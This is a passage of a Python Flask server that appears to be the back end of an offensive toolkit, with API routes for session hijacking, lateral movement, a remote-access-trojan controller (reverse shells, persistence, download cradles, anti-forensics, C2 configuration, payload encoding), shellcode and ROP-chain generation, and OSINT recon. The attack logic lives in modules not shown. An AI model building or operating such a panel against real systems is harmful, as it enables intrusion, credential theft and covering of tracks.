    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'session_assess',
                           f'Assessed session for {data.get("victim_ip", "unknown")}', request.remote_addr)
    return jsonify(result)


@app.route('/api/session-hijack/history', methods=['GET'])
def api_hijack_history():
    victim_ip = request.args.get('victim_ip')
    records = db.get_session_hijacks(victim_ip)
    return jsonify({'records': records})


@app.route('/api/session-hijack/<int:hijack_id>', methods=['DELETE'])
def api_hijack_delete(hijack_id):
    db.delete_session_hijack(hijack_id)
    return jsonify({'status': 'deleted'})


# ═══════════════════════════════════════════════════════════════
# PIVOT ENGINE API
# ═══════════════════════════════════════════════════════════════

@app.route('/api/pivot/capabilities', methods=['GET'])
def api_pivot_caps():
    from pivot_engine import get_pivot_capabilities
    return jsonify(get_pivot_capabilities())


@app.route('/api/pivot/attack-graph', methods=['POST'])
def api_pivot_graph():
    from pivot_engine import build_attack_graph
    data = request.get_json(force=True)
    hosts = data.get('hosts', [])
    credentials = data.get('credentials', [])
    sessions = data.get('sessions')
    result = build_attack_graph(hosts, credentials, sessions)
    track_event('pivot')
    # Save
    db.save_pivot_record('attack_graph', data.get('name', 'Attack Graph'),
                         result, result.get('total_hosts', 0),
                         result.get('total_lateral_paths', 0), 0,
                         session.get('IAm-logined', 'unknown'))
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'attack_graph',
                           f'Built attack graph: {result.get("total_hosts")} hosts', request.remote_addr)
    return jsonify(result)


@app.route('/api/pivot/credential-reuse', methods=['POST'])
def api_pivot_cred_reuse():
    from pivot_engine import map_credential_reuse
    data = request.get_json(force=True)
    credentials = data.get('credentials', [])
    hosts = data.get('hosts', [])
    result = map_credential_reuse(credentials, hosts)
    track_event('pivot')
    return jsonify(result)


@app.route('/api/pivot/privesc', methods=['POST'])
def api_pivot_privesc():
    from pivot_engine import suggest_privesc
    data = request.get_json(force=True)
    os_type = data.get('os_type', 'linux')
    current_user = data.get('current_user', 'user')
    result = suggest_privesc(os_type, current_user)
    track_event('pivot')
    return jsonify(result)


@app.route('/api/pivot/kill-chain', methods=['POST'])
def api_pivot_killchain():
    from pivot_engine import track_kill_chain
    data = request.get_json(force=True)
    events = data.get('events', [])
    result = track_kill_chain(events)
    track_event('pivot')
    # Save
    db.save_pivot_record('kill_chain', 'Kill Chain Assessment',
                         result, 0, 0, result.get('coverage_percent', 0),
                         session.get('IAm-logined', 'unknown'))
    return jsonify(result)


@app.route('/api/pivot/attack-surface', methods=['POST'])
def api_pivot_surface():
    from pivot_engine import score_attack_surface
    data = request.get_json(force=True)
    result = score_attack_surface(
        hosts=data.get('hosts', []),
        credentials=data.get('credentials', []),
        sessions=data.get('sessions', []),
        browser_exfil=data.get('browser_exfil', []))
    track_event('pivot')
    return jsonify(result)


@app.route('/api/pivot/history', methods=['GET'])
def api_pivot_history():
    record_type = request.args.get('type')
    records = db.get_pivot_records(record_type)
    return jsonify({'records': records})


@app.route('/api/pivot/<int:record_id>', methods=['DELETE'])
def api_pivot_delete(record_id):
    db.delete_pivot_record(record_id)
    return jsonify({'status': 'deleted'})


# ================================================================
#  RAT CONTROLLER API ROUTES
# ================================================================

@app.route('/api/rat/recon', methods=['POST'])
def api_rat_recon():
    from rat_controller import deep_system_recon
    result = deep_system_recon()
    track_event('rat_recon')
    db.save_rat_operation('recon', 'System Reconnaissance', platform.system().lower(), {}, result, 'low')
    return jsonify(result)


@app.route('/api/rat/persistence', methods=['POST'])
def api_rat_persistence():
    from rat_controller import generate_persistence
    data = request.get_json(force=True)
    os_type = data.get('os_type', 'windows')
    method = data.get('method', 'all')
    payload_cmd = data.get('payload_cmd', '')
    callback_url = data.get('callback_url', '')
    result = generate_persistence(os_type, method, payload_cmd, callback_url)
    track_event('rat_persistence')
    db.save_rat_operation('persistence', f'Persistence ({os_type})', os_type, data, result, 'high', 'T1547')
    return jsonify(result)


@app.route('/api/rat/shells', methods=['POST'])
def api_rat_shells():
    from rat_controller import generate_reverse_shell
    data = request.get_json(force=True)
    shell_type = data.get('shell_type', 'all')
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', '4444')
    encoding = data.get('encoding', 'none')
    result = generate_reverse_shell(shell_type, lhost, lport, encoding)
    track_event('rat_shell')
    db.save_rat_operation('shell', f'Reverse Shell ({shell_type})', 'cross', data, result, 'critical', 'T1059')
    # Also save to shell sessions
    db.save_rat_shell(f'Shell-{shell_type}', shell_type, lhost, lport, '', json.dumps(result.get('shells', {})), encoding)
    return jsonify(result)


@app.route('/api/rat/credentials/targets', methods=['GET'])
def api_rat_cred_targets():
    from rat_controller import get_credential_harvest_targets
    result = get_credential_harvest_targets()
    return jsonify(result)


@app.route('/api/rat/lateral', methods=['POST'])
def api_rat_lateral():
    from rat_controller import generate_lateral_movement
    data = request.get_json(force=True)
    technique = data.get('technique', 'all')
    target_host = data.get('target_host', '')
    username = data.get('username', '')
    password = data.get('password', '')
    domain = data.get('domain', '')
    result = generate_lateral_movement(technique, target_host, username, password, domain)
    track_event('rat_lateral')
    db.save_rat_operation('lateral_movement', f'Lateral ({technique})', 'windows', data, result, 'critical', 'T1021')
    return jsonify(result)


@app.route('/api/rat/anti-forensics', methods=['POST'])
def api_rat_antiforensics():
    from rat_controller import generate_anti_forensics
    data = request.get_json(force=True)
    action = data.get('action', 'all')
    target_os = data.get('target_os', 'windows')
    result = generate_anti_forensics(action, target_os)
    track_event('rat_antiforensics')
    db.save_rat_operation('anti_forensics', f'Anti-Forensics ({target_os})', target_os, data, result, 'critical', 'T1070')
    return jsonify(result)


@app.route('/api/rat/cradles', methods=['POST'])
def api_rat_cradles():
    from rat_controller import generate_download_cradles
    data = request.get_json(force=True)
    payload_url = data.get('payload_url', '')
    output_path = data.get('output_path', 'payload.exe')
    result = generate_download_cradles(payload_url, output_path)
    track_event('rat_cradle')
    db.save_rat_operation('download_cradle', 'Download Cradle', 'cross', data, result, 'high', 'T1105')
    return jsonify(result)


@app.route('/api/rat/injection', methods=['GET'])
def api_rat_injection():
    from rat_controller import get_injection_techniques
    result = get_injection_techniques()
    return jsonify(result)


@app.route('/api/rat/c2-config', methods=['POST'])
def api_rat_c2_config():
    from rat_controller import build_c2_config
    data = request.get_json(force=True)
    result = build_c2_config(
        protocol=data.get('protocol', 'https'),
        domain=data.get('domain', ''),
        port=data.get('port', 443),
        jitter=data.get('jitter', 20),
        sleep=data.get('sleep', 60),
        kill_date=data.get('kill_date', ''),
        user_agent=data.get('user_agent', ''),
    )
    track_event('rat_c2_config')
    db.save_rat_operation('c2_config', 'C2 Configuration', 'cross', data, result, 'high')
    return jsonify(result)


@app.route('/api/rat/encode', methods=['POST'])
def api_rat_encode():
    from rat_controller import encode_payload
    data = request.get_json(force=True)
    payload = data.get('payload', '')
    technique = data.get('technique', 'all')
    if not payload:
        return jsonify({'error': 'No payload provided'}), 400
    result = encode_payload(payload, technique)
    track_event('rat_encode')
    return jsonify(result)


@app.route('/api/rat/tunnels', methods=['POST'])
def api_rat_tunnels():
    from rat_controller import build_tunnel_config
    data = request.get_json(force=True)
    result = build_tunnel_config(
        tunnel_type=data.get('tunnel_type', 'all'),
        local_port=data.get('local_port', 8080),
        remote_host=data.get('remote_host', ''),
        remote_port=data.get('remote_port', 80),
        proxy_port=data.get('proxy_port', 1080),
    )
    track_event('rat_tunnel')
    db.save_rat_operation('tunnel', 'Network Tunnel', 'cross', data, result, 'high', 'T1572')
    return jsonify(result)


@app.route('/api/rat/history', methods=['GET'])
def api_rat_history():
    op_type = request.args.get('type')
    records = db.get_rat_operations(op_type)
    return jsonify({'records': records})


@app.route('/api/rat/<int:record_id>', methods=['DELETE'])
def api_rat_delete(record_id):
    db.delete_rat_operation(record_id)
    return jsonify({'status': 'deleted'})


# ===== AI THREAT ANALYZER ROUTES =====
from ai_threat_analyzer import AIThreatAnalyzer

@app.route('/api/ai-threat/analyze', methods=['POST'])

def api_ai_threat_analyze():
    payload = request.form.get('payload', '')
    result = AIThreatAnalyzer.analyze_payload(payload)
    return jsonify({'success': True, 'result': result})

@app.route('/api/ai-threat/behavioral', methods=['GET'])

def api_ai_threat_behavioral():
    ip = request.args.get('ip', '0.0.0.0')
    result = AIThreatAnalyzer.behavioral_analysis(ip)
    return jsonify({'success': True, 'result': result})

@app.route('/api/ai-threat/anomalies', methods=['GET'])

def api_ai_threat_anomalies():
    result = AIThreatAnalyzer.detect_anomalies()
    return jsonify({'success': True, 'result': result})

@app.route('/api/ai-threat/predict', methods=['GET'])

def api_ai_threat_predict():
    result = AIThreatAnalyzer.predictive_model()
    return jsonify({'success': True, 'result': result})

@app.route('/api/ai-threat/response-plan', methods=['GET'])

def api_ai_threat_response_plan():
    threat_type = request.args.get('type', 'malware')
    severity = request.args.get('severity', 'high')
    result = AIThreatAnalyzer.generate_response_plan(threat_type, severity)
    return jsonify({'success': True, 'result': result})

@app.route('/api/ai-threat/landscape', methods=['GET'])

def api_ai_threat_landscape():
    result = AIThreatAnalyzer.get_threat_landscape()
    return jsonify({'success': True, 'result': result})


# ===== ZERO-DAY EXPLOIT LAB ROUTES =====
from zeroday_lab import ZeroDayLab

@app.route('/api/zeroday/scan', methods=['POST'])

def api_zeroday_scan():
    target = request.form.get('target', '')
    scan_type = request.form.get('scan_type', 'full')
    result = ZeroDayLab.scan_target(target, scan_type)
    return jsonify({'success': True, 'result': result})

@app.route('/api/zeroday/shellcode', methods=['POST'])

def api_zeroday_shellcode():
    sc_type = request.form.get('type', 'reverse_tcp_x64')
    lhost = request.form.get('lhost', '0.0.0.0')
    lport = request.form.get('lport', '4444')
    result = ZeroDayLab.generate_shellcode(sc_type, lhost, int(lport))
    return jsonify({'success': True, 'result': result})

@app.route('/api/zeroday/rop', methods=['POST'])

def api_zeroday_rop():
    binary = request.form.get('binary', 'libc.so.6')
    func = request.form.get('target_function', 'system')
    result = ZeroDayLab.build_rop_chain(binary, func)
    return jsonify({'success': True, 'result': result})

@app.route('/api/zeroday/fuzz', methods=['POST'])

def api_zeroday_fuzz():
    target = request.form.get('target', '')
    fuzz_type = request.form.get('fuzz_type', 'smart')
    result = ZeroDayLab.run_fuzzer(target, fuzz_type)
    return jsonify({'success': True, 'result': result})

@app.route('/api/zeroday/cves', methods=['GET'])

def api_zeroday_cves():
    query = request.args.get('query', '')
    severity = request.args.get('severity', 'all')
    result = ZeroDayLab.search_cves(query, severity)
    return jsonify({'success': True, 'result': result})

@app.route('/api/zeroday/shellcode-types', methods=['GET'])

def api_zeroday_shellcode_types():
    result = ZeroDayLab.get_shellcode_types()
    return jsonify({'success': True, 'result': result})


# ===== QUANTUM CRYPTO ENGINE ROUTES =====
from quantum_crypto import QuantumCryptoEngine

@app.route('/api/quantum/encrypt', methods=['POST'])

def api_quantum_encrypt():
    plaintext = request.form.get('plaintext', '')
    algorithm = request.form.get('algorithm', 'kyber1024')
    result = QuantumCryptoEngine.encrypt_data(plaintext, algorithm)
    return jsonify({'success': True, 'result': result})

@app.route('/api/quantum/entropy', methods=['POST'])

def api_quantum_entropy():
    data = request.form.get('data', '')
    result = QuantumCryptoEngine.analyze_entropy(data)
    return jsonify({'success': True, 'result': result})

@app.route('/api/quantum/benchmark', methods=['GET'])

def api_quantum_benchmark():
    result = QuantumCryptoEngine.benchmark_algorithms()
    return jsonify({'success': True, 'result': result})

@app.route('/api/quantum/threat', methods=['GET'])

def api_quantum_threat():
    result = QuantumCryptoEngine.quantum_threat_assessment()
    return jsonify({'success': True, 'result': result})

@app.route('/api/quantum/key-exchange', methods=['POST'])

def api_quantum_key_exchange():
    algorithm = request.form.get('algorithm', 'kyber1024')
    result = QuantumCryptoEngine.key_exchange_simulation(algorithm)
    return jsonify({'success': True, 'result': result})

@app.route('/api/quantum/algorithms', methods=['GET'])

def api_quantum_algorithms():
    result = QuantumCryptoEngine.get_algorithms()
    return jsonify({'success': True, 'result': result})


# ===== DEEP RECON OSINT ROUTES =====
from deep_recon import DeepReconOSINT

@app.route('/api/deeprecon/domain', methods=['POST'])

def api_deeprecon_domain():
    domain = request.form.get('domain', '')
    result = DeepReconOSINT.domain_recon(domain)
    return jsonify({'success': True, 'result': result})

@app.route('/api/deeprecon/social', methods=['POST'])

def api_deeprecon_social():
    username = request.form.get('username', '')
    result = DeepReconOSINT.social_profile_search(username)
    return jsonify({'success': True, 'result': result})

@app.route('/api/deeprecon/darkweb', methods=['POST'])

def api_deeprecon_darkweb():
    query = request.form.get('query', '')
    result = DeepReconOSINT.dark_web_scan(query)
    return jsonify({'success': True, 'result': result})

@app.route('/api/deeprecon/email', methods=['POST'])

def api_deeprecon_email():
    email = request.form.get('email', '')
    result = DeepReconOSINT.email_intelligence(email)
    return jsonify({'success': True, 'result': result})

@app.route('/api/deeprecon/infra', methods=['POST'])

def api_deeprecon_infra():
    target = request.form.get('target', '')
    result = DeepReconOSINT.infrastructure_map(target)
    return jsonify({'success': True, 'result': result})

@app.route('/api/deeprecon/correlate', methods=['POST'])

def api_deeprecon_correlate():
    entities_raw = request.form.get('entities', '[]')
    try:
        entities = json.loads(entities_raw)
    except json.JSONDecodeError:
        entities = [e.strip() for e in entities_raw.split(',') if e.strip()]
    result = DeepReconOSINT.correlate_data(entities)
    return jsonify({'success': True, 'result': result})


if __name__ == '__main__':
    # Initialize database
    db.init_database()
    app.run(host='0.0.0.0', port=2525, debug=False)
